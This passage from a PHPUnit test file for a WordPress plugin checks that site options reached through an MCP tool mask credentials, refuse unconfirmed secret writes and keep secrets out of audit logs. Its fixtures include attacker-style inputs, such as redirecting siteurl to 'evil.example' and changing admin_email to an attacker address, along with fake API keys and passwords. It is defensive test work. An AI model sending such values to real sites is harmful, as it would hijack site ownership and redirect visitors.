		$obj           = new stdClass();
		$obj->password = 'Hunter2!!xx';
		$merged        = Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_probe', array( 'smtp' => $obj ), array( 'smtp' => array( 'host' => 'x' ) ), false );
		$this->assertInstanceOf( stdClass::class, $merged['value']['smtp'], 'A stored stdClass stays a stdClass (round 7).' );
		$this->assertSame( 'Hunter2!!xx', $merged['value']['smtp']->password );
		$this->assertSame( 'x', $merged['value']['smtp']->host );
		$this->assertSame( array( 'smtp.password' ), $merged['preserved'] );
	}

	public function test_admin_email_is_refused_on_the_settings_surface_too(): void {
		// P1-2: /settings had its own map and it still carried admin_email.
		update_option( 'admin_email', 'owner@example.com' );
		$request = new WP_REST_Request( 'PUT', '/mcpwp/v1/settings', array( 'title' => 'New', 'admin_email' => 'attacker@example.net' ) );
		$result  = ( new Mcpwp_REST_Site_Settings() )->update_settings( $request );

		$this->assertTrue( is_wp_error( $result ) );
		$this->assertSame( 'forbidden_option', $result->get_error_code() );
		$this->assertSame( 'write_protected:admin_email', $result->get_error_data()['rule'] );
		$this->assertSame( 'owner@example.com', get_option( 'admin_email' ) );
		$this->assertNotSame( 'New', get_option( 'blogname' ), 'A refused request writes nothing, not even the fields beside the refused one.' );
	}

	public function test_refused_writes_are_logged_with_their_rule_and_without_the_secret(): void {
		// P1-3: a refusal is the event an audit needs most, and it was silent.
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old' ) );

		$this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'live-4f8a-NEW' ) );
		$this->write( 'siteurl', 'https://evil.example' );
		$this->write( 'elementor_probe', array( 'fresh' => '***' ) );

		$log = wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] );
		$this->assertStringContainsString( 'update_option_refused', $log );
		$this->assertStringContainsString( 'secret_write_refused', $log );
		$this->assertStringContainsString( 'write_protected', $log );
		$this->assertStringContainsString( 'mask_in_write', $log );
		$this->assertStringNotContainsString( 'live-4f8a-NEW', $log );
		$this->assertSame( 3, substr_count( $log, 'update_option_refused' ) );
	}

	public function test_force_type_change_needs_allow_secrets_when_the_stored_tree_holds_a_credential(): void {
		update_option( 'elementor_probe', array( 'api_key' => 'sk_live_abcdefghijklmnop' ) );

		$refused = $this->write( 'elementor_probe', 'plain', array( 'force_type_change' => true ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'api_key' ), $refused->get_error_data()['secret_paths'] );
		$this->assertSame( 'sk_live_abcdefghijklmnop', get_option( 'elementor_probe' )['api_key'] );

		// Both confirmations: allowed.
		$written = $this->write( 'elementor_probe', 'plain', array( 'force_type_change' => true, 'allow_secrets' => true ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'plain', get_option( 'elementor_probe' ) );

		// No credential stored: the type override alone is enough, as before.
		update_option( 'elementor_probe', array( 'mode' => 'test' ) );
		$written = $this->write( 'elementor_probe', 'plain', array( 'force_type_change' => true ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written );
	}

	public function test_a_numeric_secret_is_masked_gated_and_preserved(): void {
		update_option( 'elementor_probe', array( 'pin' => 483921, 'passcode' => 90210, 'label' => 'x' ) );

		$read = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->assertSame( '***', $read['pin'] );
		$this->assertSame( '***', $read['passcode'] );

		$refused = $this->write( 'elementor_probe', array( 'pin' => 111111 ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );

		$written = $this->write( 'elementor_probe', array( 'label' => 'y' ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertEquals( 483921, get_option( 'elementor_probe' )['pin'] );
	}

	public function test_the_log_redacts_every_leaf_of_an_array_value_under_a_secret_option_name(): void {
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );

		$this->write( 'woocommerce_api_key', array( 'live' => 'plainword', 'nested' => array( 'v' => 'another' ) ), array( 'allow_secrets' => true ) );

		$log = wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] );
		$this->assertStringNotContainsString( 'plainword', $log );
		$this->assertStringNotContainsString( 'another', $log );
	}

	public function test_url_credential_forms_the_review_listed_are_masked(): void {
		update_option(
			'elementor_probe',
			array(
				'nouser'  => 'https://:S3cretP4ss@backup.example.com/sync',
				'prefix'  => 'https://api.example.com/x?client_secret=AbCdEfGh123456',
				'pass'    => 'https://api.example.com/x?user=a&password=AbCdEfGh123456',
				'plain'   => 'https://example.com/?page=2&sort=asc',
			)
		);

		$value = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->assertSame( '***', $value['nouser'] );
		$this->assertSame( '***', $value['prefix'] );
		$this->assertSame( '***', $value['pass'] );
		$this->assertSame( 'https://example.com/?page=2&sort=asc', $value['plain'] );
	}

	public function test_a_descriptive_suffix_does_not_exempt_a_hard_secret_stem(): void {
		// password_at is not a timestamp anyone should read, token_type is
		// not a type. The suffix exemption stops at hard stems.
		foreach ( array( 'pass_id', 'password_at', 'secret_name', 'token_type', 'key_name', 'api_key_label', 'salt_id', 'pin_at', 'jwt_type', 'bearer_name' ) as $field ) {
			$this->assertTrue( Mcpwp_Option_Access::is_secret_field( $field ), $field );
		}
		// Marking a field secret only MASKS it when its value is secret-shaped
		// and only GATES a write of a secret-shaped value, so a descriptive
		// key_name = "Production" is still readable.
		foreach ( array( 'auth_at', 'sig_count', 'access_level', 'license_status', 'serial_display' ) as $field ) {
			$this->assertFalse( Mcpwp_Option_Access::is_secret_field( $field ), $field );
		}
	}

	// ---------------------------------------------------------------
	// Round 5: every walker opens every encoding level.
	// ---------------------------------------------------------------

	public function test_a_credential_inside_a_json_string_inside_the_tree_is_gated_preserved_and_masked(): void {
		// Round-4 P0-1: only the redactor descended into a nested JSON
		// string; the gate, the merge and the mask check did not.
		$this->assertNotEmpty( Mcpwp_Option_Access::secret_paths_in_write( 'wp_mail_smtp', array( 'cfg' => '{"api_key":"sk_live_AbCdEf12345678"}' ) ) );
		$this->assertSame( array( 'cfg.api_key' ), Mcpwp_Option_Access::secret_paths_in_write( 'wp_mail_smtp', array( 'cfg' => '{"api_key":"sk_live_AbCdEf12345678"}' ) ) );

		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'wp_mail_smtp', array( 'cfg' => '{"smtp":{"pass":"Hunter2LiveSecret"}}' ), array( 'cfg' => '{"smtp":{}}' ), false );
		$this->assertStringContainsString( 'Hunter2LiveSecret', $merged['value']['cfg'] );
		$this->assertSame( array( 'cfg.smtp.pass' ), $merged['preserved'] );
		$this->assertIsString( $merged['value']['cfg'], 'The leaf closes back into the JSON string it was.' );

		// Live shape from the round-4 repro, through the handler.
		update_option( 'elementor_probe', array( 'providers' => '{"secret_key":"sk_live_OLDVALUE99887766"}', 'mode' => 'test' ) );
		$refused = $this->write( 'elementor_probe', array( 'providers' => '{"secret_key":"sk_live_ATTACKER99887766"}' ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'providers.secret_key' ), $refused->get_error_data()['secret_paths'] );
		$this->assertStringContainsString( 'OLDVALUE', get_option( 'elementor_probe' )['providers'] );

		// Partial write of the nested string keeps the credential.
		$written = $this->write( 'elementor_probe', array( 'providers' => '{}', 'mode' => 'live' ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertStringContainsString( 'OLDVALUE', get_option( 'elementor_probe' )['providers'] );
		$this->assertSame( 'live', get_option( 'elementor_probe' )['mode'] );
		$this->assertSame( array( 'providers.secret_key' ), $written->get_data()['preserved'] );

		// The read→edit→write loop works on this shape: the read masks the
		// nested leaf, echoing it back folds the mask to the stored value.
		$read = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->assertSame( '***', json_decode( $read['providers'], true )['secret_key'] );
		$read['mode'] = 'test';
		$written      = $this->write( 'elementor_probe', $read );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertStringContainsString( 'OLDVALUE', get_option( 'elementor_probe' )['providers'] );

		// force_type_change over a tree whose credential sits in a nested
		// string needs allow_secrets too.
		$refused = $this->write( 'elementor_probe', 'plain', array( 'force_type_change' => true ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
	}

	public function test_the_log_never_holds_a_credential_from_a_string_encoded_value(): void {
		// Round-4 P0-2: the MCP tool declares value as a string, so an
		// encoded payload is the normal path — and the log walked it as text.
		$keys = array( 'api_key', 'password', 'secret', 'token' );
		$out  = Mcpwp_Option_Access::redact_for_log( array( 'key' => 'wp_mail_smtp', 'value' => '{"smtp":{"pass":"Hunter2LivePassword"}}' ), $keys );
		$this->assertStringNotContainsString( 'Hunter2LivePassword', wp_json_encode( $out ) );

		$out = Mcpwp_Option_Access::redact_for_log( array( 'key' => 'elementor_probe', 'value' => '{"api_key":"LEAKCANARY_abc123456789xyz"}' ), $keys );
		$this->assertStringNotContainsString( 'LEAKCANARY', wp_json_encode( $out ) );
		$this->assertSame( 'elementor_probe', $out['key'] );

		$out = Mcpwp_Option_Access::redact_for_log( array( 'value' => serialize( array( 'cfg' => '{"password":"Hunter2LivePassword"}', 'host' => 'smtp.example' ) ) ), $keys ); // phpcs:ignore
		$this->assertStringNotContainsString( 'Hunter2LivePassword', wp_json_encode( $out ) );
		$this->assertStringContainsString( 'smtp.example', wp_json_encode( $out ), 'Only the credential goes; the rest of the row stays readable.' );

		// A payload with nothing to hide is returned byte-identical.
		$this->assertSame( '{"host":"smtp.example","port":587}', Mcpwp_Option_Access::redact_for_log( '{"host":"smtp.example","port":587}', $keys ) );

		// End to end through the handler's own log call, both accepted and refused.
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
		update_option( 'elementor_probe', array( 'mode' => 'test' ) );
		$this->write( 'elementor_probe', '{"api_key":"LEAKCANARY_abc123456789xyz","mode":"live"}' );
		$this->write( 'elementor_probe', '{"api_key":"LEAKCANARY_abc123456789xyz","mode":"live"}', array( 'allow_secrets' => true ) );
		$this->assertStringNotContainsString( 'LEAKCANARY', wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] ) );

		// The admin renderer uses the same walker.
		if ( ! class_exists( 'Mcpwp_Activity_Log_Page' ) ) {
			require_once dirname( __DIR__ ) . '/includes/admin/class-mcpwp-activity-log.php';
		}
		$admin  = new ReflectionMethod( Mcpwp_Activity_Log_Page::class, 'redact_sensitive' );
		$admin->setAccessible( true );
		$shown = $admin->invoke( ( new ReflectionClass( Mcpwp_Activity_Log_Page::class ) )->newInstanceWithoutConstructor(), array( 'key' => 'elementor_probe', 'value' => '{"cfg":"{\\"secret_key\\":\\"sk_live_AbCdEf12345678\\"}"}' ) );
		$this->assertStringNotContainsString( 'sk_live', wp_json_encode( $shown ) );
	}

	public function test_a_nested_serialized_string_is_masked_on_read_and_a_mask_inside_it_is_refused(): void {
		// Round-4 P1-1 and P1-3.
		$out = Mcpwp_Option_Access::redact( 'wp_mail_smtp', array( 'cfg' => serialize( array( 'pass' => 'Hunter2Live!' ) ) ) ); // phpcs:ignore
		$this->assertStringNotContainsString( 'Hunter2Live!', wp_json_encode( $out['value'] ) );
		$this->assertSame( array( 'cfg.pass' ), $out['redacted'] );
		$this->assertTrue( is_serialized( $out['value']['cfg'] ), 'Closed back into the encoding it had.' );

		$this->assertTrue( Mcpwp_Option_Access::contains_mask( array( 'cfg' => serialize( array( 'pass' => '***' ) ) ) ) ); // phpcs:ignore
		$this->assertTrue( Mcpwp_Option_Access::contains_mask( serialize( array( 'a' => '{"b":"***"}' ) ) ) ); // phpcs:ignore
		$this->assertFalse( Mcpwp_Option_Access::contains_mask( array( 'cfg' => serialize( array( 'pass' => 'x' ) ) ) ) ); // phpcs:ignore
	}

	public function test_a_serialized_string_option_stays_a_string_after_the_merge(): void {
		// Round-4 P1-2: WordPress serialises an already-serialised string a
		// second time, so get_option() returned a string before the write
		// and must return one after it.
		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'wp_mail_smtp', serialize( array( 'host' => 'a', 'pass' => 'Hunter2LiveSecret' ) ), array( 'host' => 'b' ), false ); // phpcs:ignore
		$this->assertIsString( $merged['value'] );
		$this->assertTrue( is_serialized( $merged['value'] ) );
		$back = unserialize( $merged['value'] ); // phpcs:ignore
		$this->assertSame( 'Hunter2LiveSecret', $back['pass'] );
		$this->assertSame( 'b', $back['host'] );
	}

	public function test_a_refused_settings_write_is_logged_as_a_refusal_not_a_success(): void {
		// Round-4 P2-1.
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );

		$request = new WP_REST_Request( 'PUT', '/mcpwp/v1/settings', array( 'title' => 'New', 'admin_email' => 'attacker@example.net' ) );
		( new Mcpwp_REST_Site_Settings() )->update_settings( $request );

		$rows = $GLOBALS['mcpwp_test_wpdb_rows'];
		$log  = wp_json_encode( $rows );
		$this->assertStringContainsString( 'update_settings_refused', $log );
		$this->assertStringNotContainsString( '"action":"update_settings"', $log );
		$this->assertStringContainsString( '"status_code":403', $log );
	}

	public function test_a_preserved_credential_is_never_run_through_the_sanitizer(): void {
		// Round-4 P2-2: map_deep(sanitize_text_field) over the merged value
		// mutated a preserved secret containing '<' or '%'.
		update_option( 'elementor_probe', array( 'api_key' => 'sk_live_<a%20b>AbCdEf12345678', 'mode' => 'test' ) );

		$written = $this->write( 'elementor_probe', array( 'mode' => "  li\0ve  " ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'sk_live_<a%20b>AbCdEf12345678', get_option( 'elementor_probe' )['api_key'] );
		$this->assertSame( '  live  ', get_option( 'elementor_probe' )['mode'], 'Only NUL bytes are removed; the bytes the caller sent are otherwise the bytes stored (round 7).' );

		// An encoded submission is sanitised through its tree and returned
		// in its encoding — a JSON string does not come out as text with the
		// braces stripped.
		update_option( 'elementor_probe', '{"mode":"test"}' );
		$this->write( 'elementor_probe', '{"mode":"  live  "}' );
		$this->assertSame( '{"mode":"  live  "}', get_option( 'elementor_probe' ), 'Byte-identical: nothing to remove.' );
	}

	public function test_the_action_log_snapshots_the_real_argument_and_withholds_credentials(): void {
		// Round-4 P2-5: the tool's argument is `key`, the snapshot read
		// `option` — so option rollbacks were never taken — and the snapshot
		// would have stored get_option() unredacted once the names met.
		$detect = new ReflectionMethod( Mcpwp_Action_Log::class, 'detect_resource' );
		$detect->setAccessible( true );
		$this->assertSame( array( 'type' => 'option', 'id' => 'elementor_probe' ), $detect->invoke( null, 'wp_update_option', array( 'key' => 'elementor_probe', 'value' => 'x' ) ) );

		$snapshot = new ReflectionMethod( Mcpwp_Action_Log::class, 'snapshot_option' );
		$snapshot->setAccessible( true );

		update_option( 'elementor_probe', array( 'api_key' => 'sk_live_AbCdEf12345678', 'mode' => 'test' ) );
		$snap = json_decode( $snapshot->invoke( null, 'elementor_probe' ), true );
		$this->assertArrayNotHasKey( 'value', $snap );
		$this->assertStringNotContainsString( 'sk_live', wp_json_encode( $snap ) );
		$this->assertArrayHasKey( 'withheld', $snap );

		update_option( 'elementor_probe', array( 'mode' => 'test' ) );
		$snap = json_decode( $snapshot->invoke( null, 'elementor_probe' ), true );
		$this->assertSame( array( 'mode' => 'test' ), $snap['value'] );

		// Applying a withheld snapshot is a refusal, not an empty-string write.
		$apply = new ReflectionMethod( Mcpwp_Action_Log::class, 'apply_snapshot' );
		$apply->setAccessible( true );
		$result = $apply->invoke( null, 'option', array( 'option_key' => 'elementor_probe', 'withheld' => 'x' ) );
		$this->assertInstanceOf( WP_Error::class, $result );
		$this->assertSame( 'snapshot_withheld', $result->get_error_code() );
		$this->assertSame( array( 'mode' => 'test' ), get_option( 'elementor_probe' ) );
	}

	public function test_untouched_nested_strings_come_back_byte_identical(): void {
		// A read that changes the formatting of a nested JSON string it did
		// not redact would make every diff noisy and every hash wrong.
		$raw = '{ "b": 1,   "a": [1, 2] }';
		update_option( 'elementor_probe', array( 'cfg' => $raw, 'api_key' => 'sk_live_AbCdEf12345678' ) );
		$value = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->assertSame( $raw, $value['cfg'] );
		$this->assertSame( '***', $value['api_key'] );
	}

	// ---------------------------------------------------------------
	// Round 6: edits inside encoded leaves land; shapes survive.
	// ---------------------------------------------------------------

	public function test_an_ordinary_edit_inside_an_encoded_leaf_is_written(): void {
		// Round-5 P0-1: "touched" meant "a secret was preserved here", so
		// every plain edit inside an encoded blob was thrown away with
		// updated:true.
		$old = array( 'blob' => wp_json_encode( array( 'colour' => 'red' ) ) );
		$new = array( 'blob' => wp_json_encode( array( 'colour' => 'blue' ) ) );
		$this->assertSame( '{"colour":"blue"}', Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_x', $old, $new )['value']['blob'] );

		// A credential rotation inside the blob, confirmed, lands.
		$o = array( 'blob' => wp_json_encode( array( 'pass' => 'OLD_LEAKED_KEY_abc123456' ) ) );
		$n = array( 'blob' => wp_json_encode( array( 'pass' => 'NEW_ROTATED_KEY_xyz98765' ) ) );
		$this->assertStringContainsString( 'NEW_ROTATED_KEY_xyz98765', Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_x', $o, $n, true )['value']['blob'] );

		// Unconfirmed: the handler's gate refuses the rotation by name — the
		// merge itself only folds back what is NOT a credential-shaped value.
		update_option( 'elementor_probe', $o );
		$refused = $this->write( 'elementor_probe', $n );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'blob.pass' ), $refused->get_error_data()['secret_paths'] );
		$this->assertStringContainsString( 'OLD_LEAKED_KEY_abc123456', get_option( 'elementor_probe' )['blob'] );

		// Through the handler, the round-5 live repro.
		update_option( 'elementor_probe', array( 'blob' => '{"colour":"BLUE","pass":"S3cretPassw0rdLong"}' ) );
		$written = $this->write( 'elementor_probe', array( 'blob' => '{"colour":"GREEN","pass":"ROTATED_NEW_KEY_9876543"}' ), array( 'allow_secrets' => true ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$stored = json_decode( get_option( 'elementor_probe' )['blob'], true );
		$this->assertSame( 'GREEN', $stored['colour'] );
		$this->assertSame( 'ROTATED_NEW_KEY_9876543', $stored['pass'] );
		$this->assertSame( array(), $written->get_data()['preserved'] );

		update_option( 'elementor_probe', array( 'blob' => '{"colour":"red","size":3}' ) );
		$this->write( 'elementor_probe', array( 'blob' => '{"colour":"blue","size":4}' ) );
		$this->assertSame( '{"colour":"blue","size":4}', get_option( 'elementor_probe' )['blob'], 'The submitted bytes land unchanged.' );
	}

	public function test_objects_inside_encoded_leaves_keep_their_shape(): void {
		// Round-5 P1-2 and P2-2: a serialised stdClass came back as an array
		// carrying an incomplete-class key; a JSON object with numeric keys
		// came back as a list.
		$gw       = new stdClass();
		$gw->pin  = '12345678';
		$gw->live = true;
		$in       = serialize( array( 'gw' => $gw ) ); // phpcs:ignore

		$out = Mcpwp_Option_Access::redact( 'elementor_probe', array( 'cfg' => $in ) );
		$this->assertSame( array( 'cfg.gw.pin' ), $out['redacted'] );
		$back = unserialize( $out['value']['cfg'], array( 'allowed_classes' => array( 'stdClass' ) ) ); // phpcs:ignore
		$this->assertInstanceOf( stdClass::class, $back['gw'] );
		$this->assertSame( '***', $back['gw']->pin );
		$this->assertTrue( $back['gw']->live );
		$this->assertStringNotContainsString( 'Incomplete', $out['value']['cfg'] );

		$json = '{"0":{"a":1},"1":{"a":2}}';
		$out  = Mcpwp_Option_Access::redact( 'elementor_probe', array( 'map' => $json, 'api_key' => 'sk_live_AbCdEf12345678' ) );
		$this->assertSame( $json, $out['value']['map'], 'Untouched: byte-identical.' );

		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_probe', array( 'map' => $json ), array( 'map' => '{"0":{"a":9},"1":{"a":2}}' ) );
		$this->assertStringStartsWith( '{"0":', $merged['value']['map'], 'A changed object with numeric keys closes as an object, not a list.' );

		$this->assertSame( '{}', Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_probe', array( 'e' => '{"x":1}' ), array( 'e' => '{}' ) )['value']['e'] );
		$this->assertSame( '[]', Mcpwp_Option_Access::merge_preserving_secrets( 'elementor_probe', array( 'e' => '[1]' ), array( 'e' => '[]' ) )['value']['e'] );
	}

	public function test_a_serialised_object_of_another_class_is_opaque_and_treated_as_a_secret(): void {
		// Round-5 P2-1: an O: string of a class this plugin will not revive
		// bypassed every gate as an unwalked blob.
		$blob = 'O:8:"Whatever":1:{s:3:"pin";s:8:"12345678";}';
		$this->assertTrue( Mcpwp_Option_Access::is_opaque_serialized( $blob ) );
		$this->assertSame( array( 'cfg' ), Mcpwp_Option_Access::secret_paths_in_write( 'elementor_probe', array( 'cfg' => $blob ) ) );
		$this->assertSame( array( '' ), Mcpwp_Option_Access::secret_paths_in_write( 'elementor_probe', $blob ) );
		$this->assertTrue( Mcpwp_Option_Access::contains_mask( 'O:8:"Whatever":1:{s:3:"pin";s:3:"***";}' ) );

		$out = Mcpwp_Option_Access::redact( 'elementor_probe', array( 'cfg' => $blob, 'label' => 'x' ) );
		$this->assertSame( array( 'cfg' ), $out['unwalked'], 'Not walked is reported, never mistaken for clean.' );
		$this->assertSame( '***', Mcpwp_Option_Access::redact( 'elementor_probe', array( 'secret_cfg' => $blob ) )['value']['secret_cfg'], 'Under a secret name the blob is masked whole.' );

		$refused = $this->write( 'elementor_probe', array( 'cfg' => $blob ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );

		// A stdClass IS revived and walked.
		$this->assertFalse( Mcpwp_Option_Access::is_opaque_serialized( 'O:8:"stdClass":1:{s:3:"pin";s:8:"12345678";}' ) );
	}

	public function test_a_nested_field_called_key_is_redacted_like_any_other(): void {
		// Round-5 P1-1: the option-name exemption applied at any depth.
		$keys = array();
		$out  = Mcpwp_Option_Access::redact_for_log( array( 'credentials' => array( 'key' => 'sk-live-AbCd1234EfGh5678IjKl', 'value' => 1 ) ), $keys );
		$this->assertSame( '[redacted]', $out['credentials']['key'] );
		$out = Mcpwp_Option_Access::redact_for_log( array( 'headers' => array( array( 'key' => 'ghp_AbCd1234EfGh5678IjKlMnOp', 'value' => 'x' ) ) ), $keys );
		$this->assertSame( '[redacted]', $out['headers'][0]['key'] );

		// The top row keeps the option name — unless the "name" is itself a credential.
		$this->assertSame( 'woocommerce_api_key', Mcpwp_Option_Access::redact_for_log( array( 'key' => 'woocommerce_api_key', 'value' => 'x' ), $keys )['key'] );
		$this->assertSame( '[redacted]', Mcpwp_Option_Access::redact_for_log( array( 'key' => 'sk-live-AbCd1234EfGh5678IjKl', 'value' => 'x' ), $keys )['key'] );
	}

	public function test_sanitising_a_submission_is_idempotent_and_type_preserving(): void {
		// Round-5 P2-3: the tree sanitiser turned ints into strings, escaped
		// slashes and unicode, and collapsed newlines.
		$sanitize = new ReflectionMethod( Mcpwp_REST_Site_Settings::class, 'sanitize_submitted_option_value' );
		$sanitize->setAccessible( true );
		$ctl = new Mcpwp_REST_Site_Settings();

		$verbatim = '{"a":"b","n":1,"url":"https://x/a","t":"café ✓","css":"a{\n  color: red;\n}","o":{}}';
		$this->assertSame( $verbatim, $sanitize->invoke( $ctl, 'elementor_probe', $verbatim ), 'Nothing to sanitise: the bytes are returned as sent.' );

		$s = serialize( array( 'i' => 1, 'b' => true, 'css' => "a{\n}" ) ); // phpcs:ignore
		$this->assertSame( $s, $sanitize->invoke( $ctl, 'elementor_probe', $s ) );

		$tree = array( 'n' => 1, 'b' => false, 'css' => "a{\n  color: red;\n}", 'name' => '  padded  ', 'nul' => "a\0b" );
		$out  = $sanitize->invoke( $ctl, 'elementor_probe', $tree );
		$this->assertSame( 1, $out['n'] );
		$this->assertFalse( $out['b'] );
		$this->assertStringContainsString( "\n", $out['css'] );
		$this->assertSame( '  padded  ', $out['name'] );
		$this->assertSame( 'ab', $out['nul'] );

		// GET → POST round trip through the handler leaves the stored bytes alone.
		update_option( 'elementor_probe', array( 'blob' => $verbatim ) );
		$read = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->write( 'elementor_probe', $read );
		$this->assertSame( $verbatim, get_option( 'elementor_probe' )['blob'] );
	}

	// ---------------------------------------------------------------
	// Round 7: content survives a write; a scalar over a structure is a
	// refusal; nothing credential-shaped reaches any log table.
	// ---------------------------------------------------------------

	public function test_html_and_percent_encoded_values_survive_a_round_trip_byte_for_byte(): void {
		// Round-6 P0-1: the text-field sanitiser stripped tags and %XX
		// octets from every option write.
		$value = array( 'footer' => '<p>Hi <b>there</b></p>', 'back' => 'https://x.test/?r=a%2Fb', 'tpl' => '{"tpl":"<p>Hi</p>","url":"https://x/?a=b%2Fc"}' );
		$sanitize = new ReflectionMethod( Mcpwp_REST_Site_Settings::class, 'sanitize_submitted_option_value' );
		$sanitize->setAccessible( true );
		$this->assertSame( $value, $sanitize->invoke( new Mcpwp_REST_Site_Settings(), 'elementor_probe', $value ) );

		update_option( 'elementor_probe', $value );
		$read = $this->read( 'elementor_probe' )->get_data()['value'];
		$this->write( 'elementor_probe', $read );
		$this->assertSame( $value, get_option( 'elementor_probe' ), 'GET → POST is idempotent.' );

		$this->write( 'elementor_probe', array( 'footer' => '<p>New</p>', 'back' => $value['back'], 'tpl' => $value['tpl'] ) );
		$this->assertSame( '<p>New</p>', get_option( 'elementor_probe' )['footer'] );
	}

	public function test_a_scalar_over_a_structure_holding_a_credential_is_refused_not_synthesised(): void {
		// Round-6 P0-2: path_set discarded the caller's scalar and stored a
		// JSON blob that was never stored or sent.
		$enc = '{"api_key":"sk_live_ABCDEFGH12345678","mode":"live"}';
		update_option( 'elementor_probe', array( 'gw' => $enc, 'label' => 'a' ) );

		$refused = $this->write( 'elementor_probe', array( 'gw' => 'hello', 'label' => 'b' ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'gw.api_key' ), $refused->get_error_data()['secret_paths'] );
		$this->assertSame( $enc, get_option( 'elementor_probe' )['gw'], 'Nothing was written.' );
		$this->assertSame( 'a', get_option( 'elementor_probe' )['label'] );

		// Confirmed: the caller's scalar lands as sent.
		$this->write( 'elementor_probe', array( 'gw' => 'hello', 'label' => 'b' ), array( 'allow_secrets' => true ) );
		$this->assertSame( 'hello', get_option( 'elementor_probe' )['gw'] );

		// An omitted encoded leaf comes back byte-identical, siblings and all.
		update_option( 'elementor_probe', array( 'gw' => $enc, 'label' => 'a' ) );
		$written = $this->write( 'elementor_probe', array( 'label' => 'b' ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( $enc, get_option( 'elementor_probe' )['gw'] );
		$this->assertSame( array( 'gw' ), $written->get_data()['preserved'] );

		// An omitted native container is restored whole too — host included.
		update_option( 'elementor_probe', array( 'smtp' => array( 'pass' => 'Hunter2LiveSecret', 'host' => 'smtp.old', 'port' => 587 ), 'label' => 'a' ) );
		$this->write( 'elementor_probe', array( 'label' => 'c' ) );
		$this->assertSame( array( 'pass' => 'Hunter2LiveSecret', 'host' => 'smtp.old', 'port' => 587 ), get_option( 'elementor_probe' )['smtp'] );
		$this->assertSame( 'c', get_option( 'elementor_probe' )['label'] );

		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'o', array( 'gw' => $enc ), array( 'gw' => 'hello' ) );
		$this->assertSame( array( 'gw.api_key' ), $merged['refused'] );
	}

	public function test_no_credential_reaches_the_action_log_or_the_mcp_activity_log(): void {
		// Round-6 P1-1: two audit tables held the submitted credential in
		// plaintext while the sibling row redacted it.
		if ( ! class_exists( 'Mcpwp_Action_Log' ) ) {
			require_once dirname( __DIR__ ) . '/includes/core/class-mcpwp-action-log.php';
		}
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
		$args = array( 'key' => 'elementor_probe', 'value' => array( 'gw' => '{"api_key":"sk_live_ZZZZTOPSECRET99999","mode":"live"}' ), 'allow_secrets' => true );

		$log_id = Mcpwp_Action_Log::begin( 'wp_update_option', $args, 'k1', 'site' );
		Mcpwp_Action_Log::complete( $log_id, 3, true, '' );

		$mcp = new ReflectionMethod( Mcpwp_REST_MCP::class, 'log_mcp_activity' );
		$mcp->setAccessible( true );
		$mcp->invoke( new Mcpwp_REST_MCP(), 'mcp_tool_call', array( 'tool' => 'wp_update_option', 'arguments' => $args ) );

		$rows = wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] );
		$this->assertStringNotContainsString( 'ZZZZTOPSECRET', $rows );
		$this->assertStringContainsString( 'elementor_probe', $rows, 'The option NAME is still on the record.' );
	}

	public function test_the_option_name_is_kept_in_nested_key_value_rows_and_credentials_are_not(): void {
		// Round-6 P2-1 with round-5 P1-1 still holding.
		$keys = array();
		$out  = Mcpwp_Option_Access::redact_for_log( array( 'params' => array( 'arguments' => array( 'key' => 'woocommerce_smtp_password', 'value' => 'Hunter2LivePassword' ) ) ), $keys );
		$this->assertSame( 'woocommerce_smtp_password', $out['params']['arguments']['key'] );
		$this->assertSame( '[redacted]', $out['params']['arguments']['value'] );

		$out = Mcpwp_Option_Access::redact_for_log( array( 'requests' => array( array( 'key' => 'elementor_probe', 'value' => array( 'api_key' => 'sk_live_AbCdEf12345678' ) ) ) ), $keys );
